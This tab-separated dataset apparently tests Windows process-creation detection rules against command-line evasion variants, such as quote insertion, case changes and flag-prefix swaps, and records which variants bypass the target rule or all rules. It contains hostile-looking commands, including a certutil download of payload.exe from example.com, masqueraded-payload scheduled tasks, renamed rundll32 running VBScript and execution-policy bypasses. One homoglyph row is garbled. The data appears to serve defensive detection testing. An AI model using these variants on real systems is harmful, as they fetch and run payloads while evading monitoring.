Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1036.003	proc_creation_win_susp_copy_system_dir_lolbin	LOL-Binary Copied From System Directory	f5d19838-41b5-476c-98d8-ba8af4929ee2		"powershell.exe -NoP -Command ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1036.003	proc_creation_win_susp_copy_system_dir_lolbin	LOL-Binary Copied From System Directory	f5d19838-41b5-476c-98d8-ba8af4929ee2		"powershell.exe -NOp -""c"" ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')"""	FALSE	FALSE	FALSE	
t1036.003	proc_creation_win_susp_copy_system_dir_lolbin	LOL-Binary Copied From System Directory	f5d19838-41b5-476c-98d8-ba8af4929ee2		"powershell.exe -Nop -c ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1036.003	proc_creation_win_susp_homoglyph_cyrillic_lookalikes	Potential Homoglyph Attack Using Lookalike Characters	32e280f1-8ad4-46ef-9e80-910657611fbc		"cmd.exe -""c"" p�ｽ舜ershell.exe -c ""Write-Host 'Test'"""	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""MyScheduledTask.xml"" /xml C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	FALSE	Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE (81325ce1-be01-4250-944f-b4789644556f); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /""create"" /TN ""MyScheduledTask.xml"" -""xml"" C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /""create"" /""tn"" ""MyScheduledTask.xml"" /""xml"" C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /""create"" /""tn"" ""MyScheduledTask.xml"" /xml C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /crEATe -""tn"" ""MyScheduledTask.xml"" /xMl C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	FALSE	Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE (81325ce1-be01-4250-944f-b4789644556f); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""MyScheduledTask.xml"" /""xml"" C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	FALSE	Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE (81325ce1-be01-4250-944f-b4789644556f); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""MyScheduledTask.xml"" -""xml"" C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	FALSE	Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE (81325ce1-be01-4250-944f-b4789644556f); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /""create"" /tn ""MyScheduledTask.xml"" /XML C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /CREaTE /tn ""MyScheduledTask.xml"" /xML C:\Users\Public\hidden_payload.tmp"	TRUE	TRUE	FALSE	Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE (81325ce1-be01-4250-944f-b4789644556f); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""SuspiciousTask"" /xml ""C:\temp\masqueraded_payload.txt"" /f /tr ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /crEATE /tn ""SuspiciousTask"" /xml ""C:\temp\masqueraded_payload.txt"" /f /tr ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""SuspiciousTask"" /XmL ""C:\temp\masqueraded_payload.txt"" /f /""tr"" ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe -""create"" /tn ""SuspiciousTask"" /xml ""C:\temp\masqueraded_payload.txt"" /f /tr ""dummy.xml"""	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tN ""SuspiciousTask"" -""xml"" ""C:\temp\masqueraded_payload.txt"" /""f"" /tr ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /""create"" -""tn"" ""SuspiciousTask"" -""xml"" ""C:\temp\masqueraded_payload.txt"" -""f"" /tr ""dummy.xml"""	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /CReAtE /tn ""SuspiciousTask"" /""xml"" ""C:\temp\masqueraded_payload.txt"" /f /tr ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""SuspiciousTask"" /""xml"" ""C:\temp\masqueraded_payload.txt"" /f /tr ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /""tn"" ""SuspiciousTask"" -""xml"" ""C:\temp\masqueraded_payload.txt"" /f /""tr"" ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe -""create"" /""tn"" ""SuspiciousTask"" /xml ""C:\temp\masqueraded_payload.txt"" /F /tr ""dummy.xml"""	TRUE	TRUE	TRUE	
t1036.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe /create /tn ""SuspiciousTask"" -""xml"" ""C:\temp\masqueraded_payload.txt"" /f /TR ""dummy.xml"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		certutil.exe -urlcache -split -f http://example.com/payload.exe C:\temp\payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -urlcache /""split"" /""f"" http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -urlcache -""split"" -f http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -urlcache -SPlIT -""f"" http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -URLCaChe /""split"" -F http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		certutil.exe -uRLCAche -split -f http://example.com/payload.exe C:\temp\payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -urlcache /""split"" -f http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe /""urlcache"" -split -f http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	TRUE	
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		certutil.exe -UrlcAchE -split -f http://example.com/payload.exe C:\temp\payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -""urlcache"" -SpLiT -f http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	TRUE	
t1055	proc_creation_win_wermgr_susp_child_process	Suspicious Child Process Of Wermgr.EXE	396f6630-f3ac-44e3-bfc8-1b161bc00c4e		"certutil.exe -uRlCache -""split"" -f http://example.com/payload.exe C:\temp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1055	proc_creation_win_rundll32_inline_vbs	Suspicious Rundll32 Invoking Inline VBScript	1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd	"cmd.exe /c ""copy C:\Windows\System32\rundll32.exe %%TEMP%%\updater.exe && %%TEMP%%\updater.exe vbscript:\""Execute(RegRead('...')); window.close;\"""""	"copy C:\Windows\System32\rundll32.exe %TEMP%\updater.exe && %TEMP%\updater.exe vbscript:""Execute(RegRead('...')); window.close;"""	TRUE	FALSE	FALSE	Potential Defense Evasion Via Rename Of Highly Relevant Binaries (0ba1da6d-b6ce-4366-828c-18826c9de23e); Suspicious Rundll32 Invoking Inline VBScript (1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd); LOL-Binary Copied From System Directory (f5d19838-41b5-476c-98d8-ba8af4929ee2); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1055	proc_creation_win_susp_sysnative	Process Creation Using Sysnative Folder	3c1b5fb0-c72f-45ba-abd1-4d4c353144ab		C:/Windows/Sysnative/cmd.exe	TRUE	TRUE	TRUE	
t1055	proc_creation_win_susp_userinit_child	Suspicious Userinit Child Process	b655a06a-31c0-477a-95c2-3726b83d649d		"""C:\Windows\System32\cmd.exe"" /c ""REM \netlogon\ bypass && malicious_payload.exe"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_susp_userinit_child	Suspicious Userinit Child Process	b655a06a-31c0-477a-95c2-3726b83d649d		"""C:\Windows\System32\cmd.exe"" /C ""REM \netlogon\ bypass && malicious_payload.exe"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_susp_userinit_child	Suspicious Userinit Child Process	b655a06a-31c0-477a-95c2-3726b83d649d		"""C:\Windows\System32\cmd.exe"" -""c"" ""REM \netlogon\ bypass && malicious_payload.exe"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_susp_userinit_child	Suspicious Userinit Child Process	b655a06a-31c0-477a-95c2-3726b83d649d		"""C:\Windows\System32\cmd.exe"" /""c"" ""REM \netlogon\ bypass && malicious_payload.exe"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_svchost_execution_with_no_cli_flags	Suspect Svchost Activity	16c37b52-b141-42a5-a3ea-bbe098444397		"""C:\Windows\System32\svchost.exe"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_svchost_execution_with_no_cli_flags	Suspect Svchost Activity	16c37b52-b141-42a5-a3ea-bbe098444397		C:\Windows\System32\svchost.exe -k netsvcs	TRUE	TRUE	FALSE	Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
t1055	proc_creation_win_svchost_execution_with_no_cli_flags	Suspect Svchost Activity	16c37b52-b141-42a5-a3ea-bbe098444397		"C:\Windows\System32\svchost.exe /""k"" netsvcs"	TRUE	TRUE	FALSE	Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
t1055	proc_creation_win_svchost_execution_with_no_cli_flags	Suspect Svchost Activity	16c37b52-b141-42a5-a3ea-bbe098444397		C:\Windows\System32\svchost.exe -K netsvcs	TRUE	TRUE	FALSE	Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
t1055	proc_creation_win_svchost_execution_with_no_cli_flags	Suspect Svchost Activity	16c37b52-b141-42a5-a3ea-bbe098444397		C:\Windows\System32\svchost.exe /k netsvcs	TRUE	TRUE	FALSE	Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
t1055	proc_creation_win_svchost_execution_with_no_cli_flags	Suspect Svchost Activity	16c37b52-b141-42a5-a3ea-bbe098444397		"C:\Windows\System32\svchost.exe -""k"" netsvcs"	TRUE	TRUE	FALSE	Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
t1037.001	proc_creation_win_registry_logon_script	Potential Persistence Via Logon Scripts - CommandLine	21d856f9-9281-4ded-9377-51a1a6e2a432		reg import C:\Windows\Temp\persist.reg	TRUE	TRUE	FALSE	Potential Suspicious Registry File Imported Via Reg.EXE (62e0298b-e994-4189-bc87-bc699aa62d97)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		pktmon start --capture --comp nics --trace	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		"pktmon start /""-capture"" -""-comp"" nics --trace"	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		"pktmon start /""-capture"" --comp nics --tRaCe"	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		"pktmon start --capture --comp nics -""-trace"""	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		"pktmon start /""-capture"" --comp nics /""-trace"""	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		pktmon start --capture --comp nics --traCE	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		"pktmon start /""-capture"" --comp nics --TrAcE"	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		pktmon start --capture --ComP nics --trace	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		pktmon start --capture --coMp nics --trace	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1040	proc_creation_win_susp_network_sniffing	Potential Network Sniffing Activity Using Network Tools	ba1f7802-adc7-48b4-9ecb-81e227fddfd5		"pktmon start --capture --comp nics /""-trace"""	TRUE	TRUE	FALSE	PktMon.EXE Execution (f956c7c1-0f60-4bc5-b7d7-b39ab3c08908)
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		powershell.exe -ep bypass -file C:\temp\audit.ps1	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		powershell.exe -ExecutionPolicy bypass -file C:\temp\audit.ps1	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		"powershell.exe -ExecutionPolicy bypass /""file"" C:\temp\audit.ps1"	FALSE	FALSE	FALSE	
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		powershell.exe -ExecutionPolicy bypass -fiLE C:\temp\audit.ps1	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		powershell.exe -eP bypass -fiLe C:\temp\audit.ps1	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		powershell.exe -ExecutionPolicy bypass -FilE C:\temp\audit.ps1	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1548.002	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		"powershell.exe -""ep"" bypass -FILE C:\temp\audit.ps1"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		cmd.exe /C 2>&1 1> \\127.0.0.1\C$\Temp\output.txt whoami	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		cmd.exe /c 2>&1 1> \\127.0.0.1\C$\Temp\output.txt whoami	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"cmd.exe -""C"" 2>&1 1> \\127.0.0.1\C$\Temp\output.txt whoami"	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -nop -noni -w 1 -exec bypass -c ""Write-Host 'Test'"""	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -nOp -noNi /""w"" 1 -ExeC bypass -c ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""nop"" -noni -w 1 /""exec"" bypass /""c"" ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NoProfile -nONI -w 1 -""exec"" bypass -C ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NoProfile -noni -W 1 /""exec"" bypass -Command ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NoProfile -noNI /""w"" 1 /""exec"" bypass /""c"" ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NOp -noni -w 1 -exec bypass -Command ""Write-Host 'Test'"""	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""nop"" -noni -w 1 -exEC bypass -Command ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""nop"" -noni -w 1 -eXeC bypass -Command ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
